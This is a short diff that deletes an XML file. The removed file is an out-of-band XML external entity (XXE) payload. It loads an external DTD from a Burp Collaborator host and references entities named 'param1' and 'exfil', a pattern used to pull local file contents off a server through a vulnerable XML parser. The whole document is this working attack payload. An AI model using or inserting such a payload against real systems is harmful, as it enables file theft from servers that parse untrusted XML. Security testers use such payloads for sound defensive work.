@@ -1,8 +1,0 @@
-<?xml version="1.0" ?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "http://zwzs6i51lgwtn0eaymqnl1sxgomia7.burpcollaborator.net">
-%sp;
-%param1;
-]>
-<r>&exfil;</r>
